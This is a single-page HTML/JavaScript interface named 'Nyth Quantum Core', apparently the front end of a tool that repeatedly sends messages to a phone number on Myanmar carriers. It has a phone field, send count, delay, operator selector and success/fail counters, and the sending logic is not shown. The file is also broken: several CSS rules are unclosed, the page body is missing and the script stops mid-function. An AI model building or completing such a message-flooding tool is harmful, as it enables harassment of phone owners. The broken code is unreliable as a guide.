<!DOCTYPE html>
<html lang="my">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#03050a">
<title>Nyth Quantum Core</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&family=Orbitron:wght@600;800&display=swap');

:root{
  --bg-dark:#03050a;
  --bg-panel:rgba(10, 15, 26, 0.35); 
  --bg-input:rgba(0, 0, 0, 0.45);
  --border-subtle:rgba(255, 255, 255, 0.12);
  --border-glow:rgba(56, 189, 248, 0.4);
  
  --text-main:#f8fafc;
  --text-muted:#94a3b8;
  --text-dark:#334155;
  --accent-cyan:#38bdf8;
  --accent-purple:#a855f7;
  --accent-rose:#f43f5e;
  --accent-green:#34d399;
  --accent-amber:#fbbf24;
}

*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{
  height:100vh;height:100dvh;width:100vw;margin:0;padding:0;
  font-family:'Space Grotesk',system-ui,sans-serif;
  background:var(--bg-dark);color:var(--text-main);overflow:hidden;
  user-select:none;-webkit-user-select:none;
}
body{display:flex;align-items:center;justify-content:center;padding:16px}

/* BACKGROUND */
#net{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.7}
.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;
  background-image:
    linear-gradient(rgba(56,189,248,.06) 1px,transparent 1px),
    linear-gradient(90deg,rgba(56,189,248,.06) 1px,transparent 1px);
  background-size:40px 40px}
.bg-grid::after{content:'';position:absolute;inset:0;
  background:radial-gradient(circle at center,transparent 10%,#03050a 90%)}
.radar{
  position:fixed;top:50%;left:50%;width:150vmax;height:150vmax;
  margin-top:-75vmax;margin-left:-75vmax;border-radius:50%;
  background:linear-gradient(90deg,transparent 50%,rgba(56,189,248,.15) 100%);
  animation:spin 15s linear infinite;pointer-events:none;z-index:0;
  will-change:transform}
@keyframes spin{100%{transform:rotate(360deg)}}
.light-beam{position:fixed;top:-20%;bottom:-20%;width:2px;
  background:linear-gradient(180deg,transparent,rgba(56,189,248,.3),transparent);
  animation:beamMove 8s ease-in-out infinite;pointer-events:none;z-index:0}
.light-beam.b1{left:20%}
.light-beam.b2{left:50%;animation-delay:-3s;background:linear-gradient(180deg,transparent,rgba(168,85,247,.25),transparent)}
.light-beam.b3{left:80%;animation-delay:-5s}
@keyframes beamMove{0%,100%{transform:translateX(0)}50%{transform:translateX(40px)}}
.scanlines{position:fixed;inset:0;z-index:1;pointer-events:none;opacity:.15;
  background:repeating-linear-gradient(0deg,transparent 0,transparent 2px,rgba(255,255,255,.03) 2px,rgba(255,255,255,.03) 3px);
  mix-blend-mode:overlay}

/* BOOT */
#boot{position:fixed;inset:0;z-index:99;background:var(--bg-dark);
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
  transition:opacity .6s ease,visibility .6s ease}
#boot.gone{opacity:0;visibility:hidden;pointer-events:none}
.boot-logo{font-family:'Orbitron',sans-serif;font-weight:800;font-size:18px;
  letter-spacing:.5em;color:var(--accent-cyan);text-shadow:0 0 20px var(--accent-cyan);
  animation:bootFlicker 2.4s infinite steps(1)}
@keyframes bootFlicker{
  0%,94%,100%{opacity:1}
  95%{opacity:.4}
  96%{opacity:1}
  97%{opacity:.7}
  98%{opacity:1}}
.boot-bar{width:170px;height:2px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden}
.boot-fill{width:40%;height:100%;
  background:linear-gradient(90deg,transparent,var(--accent-cyan),transparent);
  animation:bootLoad 1.2s ease-in-out infinite}
@keyframes bootLoad{0%{transform:translateX(-100%)}100%{transform:translateX(320%)}}
.boot-text{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--text-muted);
  letter-spacing:.25em;animation:blinkSlow 1.4s steps(2) infinite}
@keyframes blinkSlow{50%{opacity:.35}}

/* ============================================================
   PREMIUM MUSIC WIDGET (Live Equalizer)
   ============================================================ */
.music-widget {
  position: absolute; top: 16px; right: 16px; z-index: 20;
  width: 38px; height: 38px; border-radius: 50%;
  background: rgba(10, 15, 26, 0.6);
  border: 1px solid var(--border-glow);
  display: flex; align-items: center; justify-content: center; gap: 2px;
  cursor: pointer; backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
  box-shadow: 0 0 15px rgba(56,189,248,0.2);
  transition: all 0.3s ease;
}
.music-widget:active { transform: scale(0.9); }
.music-widget:hover { border-color: var(--accent-cyan); box-shadow: 0 0 20px rgba(56,189,248,0.5); }

/* The Bars inside */
.music-bars { display: flex; align-items: flex-end; gap: 2px; height: 14px; }
.music-bars span {
  width: 3px; background: var(--text-muted); border-radius: 1px;
  transition: background 0.3s;
}
.music-bars span:nth-child(1) { height: 6px; }
.music-bars span:nth-child(2) { height: 12px; }
.music-bars span:nth-child(3) { height: 8px; }
.music-bars span:nth-child(4) { height: 4px; }

/* When Playing */
.music-widget.playing { border-color: var(--accent-cyan); box-shadow: 0 0 20px rgba(56,189,248,0.5); }
.music-widget.playing .music-bars span { background: var(--accent-cyan); box-shadow: 0 0 5px var(--accent-cyan); animation: equalize 1s infinite alternate ease-in-out; }
.music-widget.playing .music-bars span:nth-child(1) { animation-delay: 0s; }
.music-widget.playing .music-bars span:nth-child(2) { animation-delay: 0.3s; }
.music-widget.playing .music-bars span:nth-child(3) { animation-delay: 0.1s; }
.music-widget.playing .music-bars span:nth-child(4) { animation-delay: 0.4s; }

@keyframes equalize {
  0% { height: 4px; }
  100% { height: 14px; }
}

/* SHELL (Glassmorphism) */
.shell{position:relative;z-index:2;display:flex;flex-direction:column;
  width:100%;max-width:440px;height:100%;max-height:720px;
  padding:16px;gap:10px;border-radius:24px;
  background:var(--bg-panel);
  backdrop-filter:blur(25px) saturate(180%);-webkit-backdrop-filter:blur(25px) saturate(180%);
  border:1px solid var(--border-glow);
  box-shadow:
    0 0 0 1px rgba(255,255,255,.05) inset,
    0 30px 60px -20px rgba(0,0,0,.9),
    0 0 80px -20px rgba(56,189,248,.3);
  transform:translateZ(0);
  transition:box-shadow .4s ease,border-color .4s ease;
  overflow:hidden;
}
.shell::before{content:"";position:absolute;inset:0;border-radius:inherit;pointer-events:none;
  background:linear-gradient(180deg,rgba(255,255,255,.08) 0,transparent 20%,transparent 80%,rgba(255,255,255,.02) 100%)}
.shell::after {
  content: ''; position:absolute; top: -100%; left: 0; right: 0; height: 50%;
  background: linear-gradient(180deg, transparent, rgba(56, 189, 248, 0.15), transparent);
  pointer-events: none; z-index: 10;
  animation: shellScan 6s linear infinite;
}
@keyframes shellScan {
  0% { top: -100%; }
  100% { top: 200%; }
}

body.running .shell{
  border-color:rgba(56,189,248,.6);
  box-shadow:
    0 0 0 1px rgba(56,189,248,.3) inset,
    0 30px 60px -20px rgba(0,0,0,.9),
    0 0 120px -10px rgba(56,189,248,.5);
  animation: shellPulse 2s infinite alternate;
}
@keyframes shellPulse {
  0% { border-color: rgba(56,189,248,.4); }
  100% { border-color: rgba(56,189,248,.8); }
}

.corner{position:absolute;width:20px;height:20px;border-color:var(--accent-cyan);
  opacity:.8;pointer-events:none;transition:all .4s cubic-bezier(.2,.8,.2,1);z-index:3}
.corner.tl{top:-1px;left:-1px;border-top:2px solid;border-left:2px solid;border-top-left-radius:20px}
.corner.tr{top:-1px;right:-1px;border-top:2px solid;border-right:2px solid;border-top-right-radius:20px}
.corner.bl{bottom:-1px;left:-1px;border-bottom:2px solid;border-left:2px solid;border-bottom-left-radius:20px}
.corner.br{bottom:-1px;right:-1px;border-bottom:2px solid;border-right:2px solid;border-bottom-right-radius:20px}
body.running .corner{opacity:1;width:26px;height:26px;filter:drop-shadow(0 0 10px var(--accent-cyan))}

.flex-shrink-0{flex-shrink:0}

/* HEADER */
.header{display:flex;align-items:center;justify-content:space-between;padding-right: 48px; /* Space for music widget */}
.brand{display:flex;align-items:center;gap:14px}

.logo-box{position:relative;width:46px;height:46px;border-radius:14px;
  display:flex;align-items:center;justify-content:center;
  background:rgba(0,0,0,0.5);border:1px solid rgba(56,189,248,.4);
  box-shadow:0 0 25px -5px rgba(56,189,248,.4),inset 0 0 15px rgba(56,189,248,.15);
  overflow:hidden;
  transition: all .3s;}
body.running .logo-box{
  box-shadow:0 0 35px 0 rgba(56,189,248,.8),inset 0 0 20px rgba(168,85,247,.5);
  border-color:var(--accent-cyan);
  transform: scale(1.05);
}

.logo-ring{position:absolute;inset:0;width:100%;height:100%;
  animation:spin 4s linear infinite}
.logo-ring circle{fill:none;stroke-width:1.5;stroke-linecap:round}
.logo-ring .r1{stroke:var(--accent-cyan);opacity:.85;stroke-dasharray:40 60}
.logo-ring .r2{stroke:var(--accent-purple);opacity:.65;stroke-dasharray:20 80;
  animation:spin 2.5s linear infinite reverse}

.logo-ring-outer{position:absolute;inset:0;width:100%;height:100%;
  animation:spin 15s linear infinite reverse}
.logo-ring-outer circle{fill:none;stroke:rgba(56,189,248,.4);stroke-width:1;
  stroke-dasharray:2 4}

.logo-pulse{position:absolute;inset:8px;border-radius:50%;
  background:radial-gradient(circle,rgba(56,189,248,.35),transparent 70%);
  animation:logoPulse 2s ease-in-out infinite}
@keyframes logoPulse{0%,100%{transform:scale(.8);opacity:.4}50%{transform:scale(1.2);opacity:1}}

.logo-n{position:relative;z-index:2;width:22px;height:22px;
  filter:drop-shadow(0 0 5px rgba(56,189,248,.9));
  animation: floatN 3s ease-in-out infinite;
}
@keyframes floatN { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-2px)} }

.n-main,.n-red,.n-blue{fill:none;stroke-width:2.5;stroke-linecap:square;stroke-linejoin:miter}
.n-main{stroke:url(#nGrad)}
.n-red{stroke:var(--accent-rose);animation:glitchRed 2s infinite steps(1);opacity:0}
.n-blue{stroke:var(--accent-cyan);animation:glitchBlue 2s infinite steps(1);opacity:0}

@keyframes glitchRed{
  0%,92%,100%{transform:translate(0);opacity:0}
  93%{transform:translate(-3px,-1px);opacity:.9}
  95%{transform:translate(2px,1px);opacity:0}
  97%{transform:translate(-2px,0);opacity:.9}
  99%{transform:translate(0);opacity:0}}
@keyframes glitchBlue{
  0%,92%,100%{transform:translate(0);opacity:0}
  93%{transform:translate(3px,1px);opacity:.9}
  95%{transform:translate(-2px,-1px);opacity:0}
  97%{transform:translate(2px,0);opacity:.9}
  99%{transform:translate(0);opacity:0}}

.logo-scan{position:absolute;inset:0;z-index:3;pointer-events:none;
  background:linear-gradient(180deg,transparent,rgba(125,211,252,1),transparent);
  height:2px;width:100%;top:-10%;
  animation:scanLine 2.5s cubic-bezier(.4,0,.2,1) infinite}
@keyframes scanLine{
  0%{top:-10%;opacity:0}
  10%{opacity:1}
  90%{top:110%;opacity:1}
  100%{top:110%;opacity:0}}

.brand-text{display:flex;flex-direction:column;gap:4px}
.title{position:relative;display:inline-block;font-family:'Orbitron',sans-serif;
  font-weight:800;font-size:15px;letter-spacing:.05em;line-height:1}
.title .t-base{position:relative;background:linear-gradient(90deg,#7dd3fc,#c084fc,#f0abfc);
  -webkit-background-clip:text;background-clip:text;color:transparent;z-index:2}
.title .t-red,.title .t-blue{position:absolute;top:0;left:0;opacity:0;mix-blend-mode:screen;z-index:1}
.title .t-red{color:var(--accent-rose);animation:tGlitchRed 3s infinite steps(1)}
.title .t-blue{color:var(--accent-cyan);animation:tGlitchBlue 3s infinite steps(1)}
@keyframes tGlitchRed{
  0%,94%,100%{opacity:0;transform:none}
  95%{opacity:.8;transform:translate(-2px,-1px)}
  97%{opacity:0}
  98%{opacity:.8;transform:translate(1px,1px)}}
@keyframes tGlitchBlue{
  0%,94%,100%{opacity:0;transform:none}
  95%{opacity:.8;transform:translate(2px,1px)}
  97%{opacity:0}
  98%{opacity:.8;transform:translate(-1px,-1px)}}
.title-wrap{position:relative;overflow:hidden;border-radius:2px}
.title-wrap::after{content:'';position:absolute;top:0;bottom:0;left:-100%;width:60%;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);
  transform:skewX(-20deg);animation:titleShine 4s infinite}
@keyframes titleShine{0%,80%,100%{left:-100%}85%{left:130%}}

.subtitle{font-family:'JetBrains Mono',monospace;font-size:8.5px;font-weight:700;
  color:#cbd5e1;letter-spacing:.15em;margin:0;text-shadow:0 1px 2px rgba(0,0,0,.8)}

.status-wrap{display:flex;align-items:center;gap:8px}
.signal{display:flex;align-items:flex-end;gap:2px;height:12px}
.signal span{width:2px;background:rgba(148,163,184,.5);border-radius:1px;transition:background .3s}
.signal span:nth-child(1){height:3px}
.signal span:nth-child(2){height:6px}
.signal span:nth-child(3){height:9px}
.signal span:nth-child(4){height:12px}
body.running .signal span{background:var(--accent-cyan);animation:signalFlick 1s ease-in-out infinite;
  box-shadow:0 0 4px var(--accent-cyan)}
body.running .signal span:nth-child(2){animation-delay:.12s}
body.running .signal span:nth-child(3){animation-delay:.24s}
body.running .signal span:nth-child(4){animation-delay:.36s}
@keyframes signalFlick{0%,100%{opacity:.35}50%{opacity:1}}

.status-badge{display:flex;align-items:center;gap:6px;
  padding:5px 10px;border-radius:6px;
  background:rgba(0,0,0,.5);border:1px solid var(--border-subtle);
  transition:all .3s}
body.running .status-badge{border-color:rgba(56,189,248,.5);background:rgba(56,189,248,.1)}
.status-dot{width:6px;height:6px;border-radius:50%;
  background:var(--accent-green);box-shadow:0 0 6px var(--accent-green)}
body.running .status-dot{background:var(--accent-cyan);box-shadow:0 0 8px var(--accent-cyan);
  animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.status-text{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;
  letter-spacing:.1em;color:#cbd5e1}
body.running .status-text{color:var(--accent-cyan);text-shadow:0 0 5px var(--accent-cyan)}

/* PROGRESS */
.arc-wrap{margin:2px 0;position:relative}
.arc-ticks{display:flex;gap:2px;margin-bottom:6px;height:6px}
.arc-ticks .tick{flex:1;background:rgba(255,255,255,.1);border-radius:1px;
  transition:background .3s,box-shadow .3s}
.arc-ticks .tick.on{background:var(--accent-cyan);box-shadow:0 0 6px var(--accent-cyan);
  animation: tickPulse .5s ease forwards}
@keyframes tickPulse { 0% { transform: scaleY(1); } 50% { transform: scaleY(1.5); } 100% { transform: scaleY(1); } }

.arc-track{height:4px;border-radius:4px;background:rgba(0,0,0,.4);
  position:relative;overflow:hidden;
  box-shadow:inset 0 1px 2px rgba(0,0,0,.8)}
#arcFill{height:100%;width:0%;border-radius:4px;position:relative;
  background:linear-gradient(90deg,var(--accent-cyan),var(--accent-purple),var(--accent-rose));
  background-size:200% 100%;
  animation:flow 3s linear infinite;
  transition:width .4s cubic-bezier(.2,.8,.2,1);
  box-shadow:0 0 15px var(--accent-cyan)}
#arcFill::after{content:'';position:absolute;right:0;top:0;bottom:0;width:20px;
  background:linear-gradient(90deg,transparent,#fff);opacity:.8;filter:blur(2px)}
@keyframes flow{0%{background-position:0% 50%}100%{background-position:200% 50%}}

.arc-meta{display:flex;justify-content:space-between;margin-top:6px;
  font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;
  color:#cbd5e1;letter-spacing:.1em;text-shadow:0 1px 2px rgba(0,0,0,.8)}
.arc-meta strong{color:var(--text-main);font-weight:700;text-shadow:0 0 8px rgba(255,255,255,.5)}

/* FORM */
.form-group{display:flex;flex-direction:column;gap:10px}
.input-group{position:relative;display:flex;flex-direction:column;gap:6px}
.label-row{display:flex;justify-content:space-between;align-items:center}
label{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;
  color:#cbd5e1;letter-spacing:.1em;transition:color .3s;text-shadow:0 1px 2px rgba(0,0,0,.8)}
.input-group.focused label{color:var(--accent-cyan);text-shadow:0 0 8px var(--accent-cyan)}
.meta-label{font-family:'JetBrains Mono',monospace;font-size:8px;color:var(--text-muted)}

.input-field{width:100%;padding:10px 12px;border-radius:8px;
  background:var(--bg-input);border:1px solid var(--border-subtle);
  color:var(--text-main);font-family:'JetBrains Mono',monospace;font-size:14px;
  transition:all .3s}
.input-field::placeholder{color:var(--text-dark)}
.input-field:hover{border-color:rgba(255,255,255,.3)}
.input-field:focus{outline:none;border-color:var(--accent-cyan);
  background:rgba(56,189,248,.1);
  box-shadow:0 0 0 2px rgba(56,189,248,.2),inset 0 0 15px rgba(56,189,248,.1);
  animation: inputGlow 2s infinite alternate;}
@keyframes inputGlow {
  0% { box-shadow: 0 0 0 2px rgba(56,189,248,.1), inset 0 0 10px rgba(56,189,248,.05); }
  100% { box-shadow: 0 0 0 3px rgba(56,189,248,.3), inset 0 0 20px rgba(56,189,248,.2); }
}
.input-field.invalid{border-color:var(--accent-rose);box-shadow:0 0 0 2px rgba(244,63,94,.2); animation:none;}

.input-group .scan-line{position:absolute;bottom:0;left:10px;right:10px;height:2px;
  background:linear-gradient(90deg,transparent,var(--accent-cyan),transparent);
  opacity:0;border-radius:2px;pointer-events:none;
  transition:opacity .3s}
.input-group.focused .scan-line{opacity:1;animation:scan 2s linear infinite}
@keyframes scan{
  0%{transform:scaleX(0);transform-origin:left}
  45%{transform:scaleX(1);transform-origin:left}
  55%{transform:scaleX(1);transform-origin:right}
  100%{transform:scaleX(0);transform-origin:right}}

.op-pills{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
.pill-btn{position:relative;padding:8px;border-radius:8px;
  background:var(--bg-input);border:1px solid var(--border-subtle);
  color:#cbd5e1;font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;
  display:flex;align-items:center;justify-content:center;gap:6px;
  cursor:pointer;transition:all .2s;overflow:hidden}
.pill-btn:hover{background:rgba(255,255,255,.1);color:var(--text-main);transform:translateY(-1px)}
.pill-btn:active{transform:scale(.95)}
.pill-btn.active{color:var(--text-main);border-color:rgba(56,189,248,.6);
  background:rgba(56,189,248,.2);box-shadow:inset 0 0 15px rgba(56,189,248,.3)}
.pill-btn.active[data-op="mytel"]{border-color:rgba(244,63,94,.6);
  background:rgba(244,63,94,.2);box-shadow:inset 0 0 15px rgba(244,63,94,.3)}
.pill-btn.active[data-op="u9"]{border-color:rgba(168,85,247,.6);
  background:rgba(168,85,247,.2);box-shadow:inset 0 0 15px rgba(168,85,247,.3)}
.pill-btn.active::after{content:'';position:absolute;left:20%;right:20%;bottom:0;height:2px;
  background:linear-gradient(90deg,transparent,currentColor,transparent);
  box-shadow: 0 0 8px currentColor;}

.pill-dot{width:6px;height:6px;border-radius:50%;transition:box-shadow .3s}
.pill-btn.active .pill-dot{box-shadow:0 0 8px currentColor}
.dot-sky{background:var(--accent-cyan);color:var(--accent-cyan)}
.dot-rose{background:var(--accent-rose);color:var(--accent-rose)}
.dot-purple{background:var(--accent-purple);color:var(--accent-purple)}

.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:10px}

/* BUTTONS */
.actions{display:flex;gap:10px;margin-top:4px}
.btn-primary{flex:1;padding:14px;border-radius:12px;border:1px solid rgba(56,189,248,.6);
  background:linear-gradient(180deg,rgba(11,18,32,0.8),rgba(8,12,21,0.9));
  color:#f0f9ff;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:800;
  letter-spacing:.15em;cursor:pointer;position:relative;overflow:hidden;
  box-shadow:0 10px 30px -12px rgba(59,130,246,.8),0 0 40px -20px rgba(56,189,248,1);
  transition:all .2s cubic-bezier(.2,.8,.2,1)}
.btn-primary:hover:not(:disabled){filter:brightness(1.3);transform:translateY(-2px);
  box-shadow:0 15px 35px -12px rgba(59,130,246,1),0 0 50px -15px rgba(56,189,248,1);
  border-color:var(--accent-cyan)}
.btn-primary:active:not(:disabled){transform:translateY(1px) scale(.98)}
.btn-primary:disabled{filter:grayscale(1) brightness(.4);cursor:not-allowed;
  border-color:transparent;box-shadow:none;transform:none}
.btn-primary::after{content:'';position:absolute;top:0;left:-100%;width:50%;height:100%;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);
  transform:skewX(-20deg)}
.btn-primary.engine-active::after{animation:shine 1.2s infinite}
@keyframes shine{100%{left:200%}}

.btn-danger{padding:14px 18px;border-radius:12px;border:1px solid rgba(244,63,94,.4);
  background:rgba(244,63,94,.15);color:var(--accent-rose);
  font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:800;letter-spacing:.1em;
  cursor:pointer;transition:all .2s}
.btn-danger:hover:not(:disabled){background:rgba(244,63,94,.3);
  border-color:var(--accent-rose);transform:translateY(-2px);
  box-shadow:0 0 25px -5px rgba(244,63,94,.8)}
.btn-danger:active:not(:disabled){transform:translateY(1px) scale(.98)}
.btn-danger:disabled{opacity:.2;cursor:not-allowed;transform:none}

/* STATS */
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.stat-box{position:relative;padding:12px 14px 16px;border-radius:12px;
  background:linear-gradient(180deg,rgba(5,8,16,.6),rgba(3,6,12,.4));
  border:1px solid rgba(255,255,255,.1);box-shadow:inset 0 4px 20px rgba(0,0,0,.4);
  overflow:hidden;transition:all .3s}
body.running .stat-box{border-color:rgba(56,189,248,.4);box-shadow:inset 0 4px 20px rgba(0,0,0,.4), 0 0 15px rgba(56,189,248,.2)}
.stat-box::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px}
.stat-ok::before{background:var(--accent-green);box-shadow:0 0 10px var(--accent-green)}
.stat-err::before{background:var(--accent-rose);box-shadow:0 0 10px var(--accent-rose)}

/* Stat Box internal scanline when running */
.stat-box::after{content:'';position:absolute;top:0;bottom:0;left:-100%;width:50%;
  background:linear-gradient(90deg,transparent,rgba(56,189,248,.2),transparent);
  transform:skewX(-20deg); pointer-events:none;}
body.running .stat-box::after { animation: statScan 2s linear infinite; }
@keyframes statScan { 0% { left: -100%; } 100% { left: 200%; } }

.stat-title{font-family:'JetBrains Mono',monospace;font-size:8.5px;font-weight:800;
  color:#cbd5e1;letter-spacing:.15em;margin-bottom:6px;text-transform:uppercase;text-shadow:0 1px 2px rgba(0,0,0,.8)}
.stat-val{font-family:'JetBrains Mono',monospace;font-size:22px;font-weight:800;line-height:1;
  font-variant-numeric:tabular-nums}
.stat-ok .stat-val{color:var(--accent-green);text-shadow:0 0 15px rgba(52,211,153,.8)}
.stat-err .stat-val{color:var(--accent-rose);text-shadow:0 0 15px rgba(244,63,94,.8)}
.stat-val.bump{animation:bumpAnim .4s cubic-bezier(.2,.8,.2,1)}
@keyframes bumpAnim{0%{transform:scale(1)}40%{transform:scale(1.3)}100%{transform:scale(1)}}

.spark-canvas{position:absolute;bottom:0;left:0;width:100%;height:14px;opacity:.7;pointer-events:none}
.stat-underline{position:absolute;left:14px;right:14px;bottom:8px;height:2px;
  background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden}
.stat-underline::after{content:'';position:absolute;inset:0;
  animation:pulseBar 2s infinite ease-in-out;transform-origin:left}
.stat-ok .stat-underline::after{background:linear-gradient(90deg,var(--accent-green),transparent)}
.stat-err .stat-underline::after{background:linear-gradient(90deg,var(--accent-rose),transparent)}
@keyframes pulseBar{0%,100%{transform:scaleX(.3)}50%{transform:scaleX(1)}}

/* LOG */
.log-section{flex:1;display:flex;flex-direction:column;min-height:0;margin-top:2px}
.log-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
.log-header-left{display:flex;align-items:center;gap:8px}
.log-title{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:800;

.log-tabs{display:flex;gap:2px;background:rgba(0,0,0,.6);padding:2px;

.log-console{flex:1;min-height:0;overflow-y:auto;border-radius:12px;
  background:rgba(0,0,0,.6);border:1px solid rgba(56,189,248,.3);
  padding:10px 12px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.7;

.log-console::before {

<script>
'use strict';

/* ============================================================
   AUDIO LOGIC (Local Nyth.mp3)
   ============================================================ */
const audio = document.getElementById('bgAudio');
const musicWidget = document.getElementById('musicWidget');
let isPlaying = false;

// မျက်နှာပြင်ကို ပထမဆုံး ထိလိုက်တာနဲ့ သီချင်းစဖွင့်မယ်
const startAudio = () => {
  if (!isPlaying) {
    audio.play().then(() => {
      isPlaying = true;
      musicWidget.classList.add('playing');
    }).catch(e => {
      console.log('Autoplay blocked by browser:', e);
    });
  }
  document.body.removeEventListener('touchstart', startAudio);
  document.body.removeEventListener('click', startAudio);
};

document.body.addEventListener('touchstart', startAudio, { passive: true });
document.body.addEventListener('click', startAudio, { passive: true });

// Audio Play/Pause Event များကို ဖတ်ပြီး UI ပြောင်းမယ်
audio.addEventListener('play', () => {
  isPlaying = true;
  musicWidget.classList.add('playing');
});

audio.addEventListener('pause', () => {
  isPlaying = false;
  musicWidget.classList.remove('playing');
});

// ခလုတ်နှိပ်ရင် ဖွင့်/ရပ် လုပ်မယ်
function toggleMusic(event) {
  if (event) event.stopPropagation(); // Body click မဖြစ်အောင် တားဆီးမယ်
  
  if (isPlaying) {
    audio.pause();
  } else {
    audio.play().catch(e => console.log('Play failed', e));
  }
}

/* ============================================================
   MAIN UI LOGIC
   ============================================================ */
setTimeout(() => document.getElementById('boot').classList.add('gone'), 1400);

(() => {
  const wrap = document.getElementById('arcTicks');
  for (let i = 0; i < 20; i++) {
    const t = document.createElement('div');
    t.className = 'tick';
    wrap.appendChild(t);
  }
})();

(() => {
  const c = document.getElementById('net');
  const ctx = c.getContext('2d');
  let w = 0, h = 0, dpr = 1;
  const pts = [];
  const resize = () => {
    dpr = Math.min(window.devicePixelRatio || 1, 2);
    w = c.width = Math.floor(innerWidth * dpr);
    h = c.height = Math.floor(innerHeight * dpr);
    c.style.width = innerWidth + 'px';
    c.style.height = innerHeight + 'px';
  };
  resize();
  addEventListener('resize', resize);
  const N = 40;
  for (let i = 0; i < N; i++) {
    pts.push({
      x: Math.random() * w, y: Math.random() * h,
      vx: (Math.random() - .5) * .3 * dpr, vy: (Math.random() - .5) * .3 * dpr,
      r: Math.random() * 1.5 + .5
    });
  }
  const tick = () => {
    ctx.clearRect(0, 0, w, h);
    for (const p of pts) {
      p.x += p.vx; p.y += p.vy;
      if (p.x < 0 || p.x > w) p.vx *= -1;
      if (p.y < 0 || p.y > h) p.vy *= -1;
    }
    const maxD = 130 * dpr;
    for (let i = 0; i < pts.length; i++) {
      const a = pts[i];
      for (let j = i + 1; j < pts.length; j++) {
        const b = pts[j];
        const dx = a.x - b.x, dy = a.y - b.y;
        const d = Math.hypot(dx, dy);
        if (d < maxD) {
          const alpha = (1 - d / maxD) * .4;
          ctx.strokeStyle = 'rgba(125,211,252,' + alpha + ')';
          ctx.lineWidth = .5 * dpr;
          ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.lineTo(b.x, b.y); ctx.stroke();
        }
      }
    }
    for (const p of pts) {
      ctx.beginPath(); ctx.fillStyle = 'rgba(125,211,252,.9)';
      ctx.arc(p.x, p.y, p.r * dpr, 0, Math.PI * 2); ctx.fill();
    }
    requestAnimationFrame(tick);
  };
  tick();
})();

const sparks = { ok: [], err: [] };
const SPARK_MAX = 24;
function drawSpark(kind) {
  const cv = document.querySelector('canvas[data-spark="' + kind + '"]');
  if (!cv) return;
  const rect = cv.getBoundingClientRect();
  if (rect.width === 0 || rect.height === 0) return;
  const dpr = Math.min(window.devicePixelRatio || 1, 2);
  const W = Math.floor(rect.width * dpr);
  const H = Math.floor(rect.height * dpr);
  if (cv.width !== W) cv.width = W;
  if (cv.height !== H) cv.height = H;
  const ctx = cv.getContext('2d');
  ctx.clearRect(0, 0, W, H);
  const data = sparks[kind];
  if (data.length < 2) return;
  const max = Math.max(1, ...data);
  ctx.beginPath();
  data.forEach((v, i) => {
    const x = (i / (data.length - 1)) * W;
    const y = H - (v / max) * (H - 2) - 1;
    if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
  });
  ctx.strokeStyle = kind === 'ok' ? 'rgba(52,211,153,1)' : 'rgba(244,63,94,1)';
  ctx.lineWidth = 1.5 * dpr;
  ctx.lineJoin = 'round';
  ctx.shadowBlur = 4 * dpr;
  ctx.shadowColor = ctx.strokeStyle;
  ctx.stroke();
  ctx.shadowBlur = 0;
}
function pushSpark(kind, val) {
  sparks[kind].push(val);
  if (sparks[kind].length > SPARK_MAX) sparks[kind].shift();
  drawSpark(kind);
}
addEventListener('resize', () => { drawSpark('ok'); drawSpark('err'); });

let worker = null;
let currentOp = 'auto';
let success = 0, fail = 0, dispatched = 0;
let sessionTotal = 0, sessionDelay = 0, sessionStart = 0;
let etaTimer = null;
let logFilter = 'all';

[['phoneInput','phoneGroup'],['countInput','countGroup'],['delayInput','delayGroup']].forEach(([inp,grp]) => {
  const i = document.getElementById(inp);
  const g = document.getElementById(grp);
  i.addEventListener('focus', () => g.classList.add('focused'));
  i.addEventListener('blur', () => g.classList.remove('focused'));
  i.addEventListener('input', () => i.classList.remove('invalid'));
});

function setOperator(op) {
  currentOp = op;
  document.querySelectorAll('.pill-btn').forEach(b => {
    b.classList.toggle('active', b.dataset.op === op);
  });
}

function bump(el) {
  el.classList.remove('bump');
  void el.offsetWidth;
  el.classList.add('bump');
}

function animateNumber(el, from, to) {
  if (from === to) { el.textContent = String(to); return; }
  const dur = 320;
  const start = performance.now();
  const step = (t) => {
    const p = Math.min(1, (t - start) / dur);
    const eased = 1 - Math.pow(1 - p, 3);
    el.textContent = String(Math.round(from + (to - from) * eased));
    if (p < 1) requestAnimationFrame(step);
  };
  requestAnimationFrame(step);
}

function logMsg(msg, type, idx) {
  type = type || 'info';
  const box = document.getElementById('logConsole');
  const time = new Date().toLocaleTimeString('en-GB', { hour12: false });

  const div = document.createElement('div');
  div.className = 'log-line ' + type;
  div.dataset.sev = type === 'success' ? 'ok' : type === 'error' ? 'err' : 'sys';

  const idxText = (idx == null) ? '[--]' : '[' + String(idx).padStart(2, '0') + ']';
